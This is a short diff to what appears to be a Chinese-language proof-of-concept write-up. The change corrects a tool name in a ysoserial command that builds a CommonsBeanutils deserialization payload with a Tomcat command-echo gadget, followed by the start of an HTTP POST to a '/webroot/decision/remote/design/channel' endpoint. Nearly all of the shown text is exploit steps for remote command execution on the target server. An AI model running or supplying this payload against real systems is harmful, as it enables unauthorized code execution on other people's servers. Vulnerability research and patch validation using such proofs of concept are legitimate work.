@@ -23,7 +23,7 @@
 验证POC
 
 ```
-java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch "cmd" > fine10.bin
+java -jar ysoserial-1.5-su18-all.jar -g CommonsBeanutils1183NOCC -p 'EX-TomcatEcho' -ch "cmd" > fine10.bin
 
 POST /webroot/decision/remote/design/channel HTTP/1.1
 Content-Type: application/json
